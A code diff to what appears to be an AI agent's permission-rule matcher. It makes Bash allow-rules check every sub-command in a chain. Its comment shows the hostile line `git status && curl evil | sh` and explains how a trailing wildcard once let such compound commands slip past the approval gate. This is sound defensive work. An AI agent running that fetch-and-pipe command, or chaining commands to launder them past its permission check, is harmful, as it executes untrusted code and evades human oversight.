@@ -101,6 +101,10 @@ export function defaultForMode(mode: PermissionMode, req: PermissionRequest): De
   }
 }
 
+/** Allow matching. For Bash it is sub-command aware with AND semantics: EVERY simple-command
+ *  in a chain must match the pattern, so an allow like `Bash(git*)` auto-approves `git status`
+ *  but NOT `git status && curl evil | sh` — a trailing `*` can no longer launder a compound
+ *  command past the gate (the whole-command match `^git.*$` used to cover the entire chain). */
 function ruleMatches(rule: string, req: PermissionRequest): boolean {
   const m = rule.match(/^([A-Za-z_]+)(?:\((.*)\))?$/);
   if (!m) return false;
@@ -108,6 +112,10 @@ function ruleMatches(rule: string, req: PermissionRequest): boolean {
   const pattern = m[2];
   if (tool !== req.toolName) return false;
   if (pattern === undefined) return true;
+  if (req.toolName === "Bash") {
+    const subs = splitShellCommands(String(req.input.command ?? ""));
+    return subs.length > 0 && subs.every((sub) => globMatch(pattern, sub));
+  }
   return globMatch(pattern, representativeArg(req));
 }
 
